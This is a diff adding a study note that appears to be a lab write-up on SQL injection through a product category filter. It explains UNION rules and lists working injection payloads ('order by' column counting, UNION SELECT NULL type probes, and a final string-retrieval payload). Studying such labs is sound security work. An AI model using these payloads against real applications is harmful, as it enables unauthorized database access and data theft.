@@ -1,0 +1,73 @@
+SQLi: Product Category Filter
+End Goal: Determine number of columns returned by the query
+
+Background (Union Operator)
+
+Table 1                 Table 2
+
+a | b                   c | d
+------                  ------
+1 , 2                   2 , 3
+3 , 4                   4 , 5
+
+Query #1: SELECT a, b from table1
+1, 2
+3, 4
+
+Query #2: SELECT a, b from table1 UNION SELECT c, d from table2
+1, 2
+3, 4
+2, 3
+4, 5
+
+UNION Operator Rules:
+
+- Number and order of columns must be the same in all the queries
+- The data types must be compatible
+
+Step #1: Determine the number of columns
+
+Approach 1: Iteratively adding SELECT NULL statements until you no longer generate errors
+
+select ? from table 1 UNION select NULL, NULL ...
+
+Error => Incorrect number of columns!
+200 response code => Correct number of columns!
+
+Approach 2: Use ORDER BY column
+
+select a, b from table1 ORDER BY 3
+
+200 response code => Column number exists
+Error => Column doesn't exist
+
+Step #1: Determine the data type of columns
+
+Iteratively test each column for specific data type
+
+select a, b, c from table1 UNION select "a", NULL, NULL
+
+Error => Column "a" is not of type string
+No error => Column "a" is of type string
+
+Then try the rest similarly
+select a, b, c from table1 UNION select NULL, "a", NULL
+select a, b, c from table1 UNION select NULL, NULL, "a"
+
+ANALYSIS
+--------------
+
+Determine number of columns
+
+' order by 1--  # Then 2, 3 and so on
+' order by 4--  # Throws an error => We only have 3 columns (First column - ID)
+
+We now determine the data type of the columns
+
+' UNION select 'a', NULL, NULL--    # Error => Column not of type string
+' UNION select NULL, 'a', NULL--    # 200 response code => Column of data type string
+' UNION select 'NULL', NULL, 'a'--  # Error => Column not of type string
+
+We can now use the second column to retrieve the string "2cHENO" from the database:
+
+' UNION select NULL, '2cHENO', NULL--
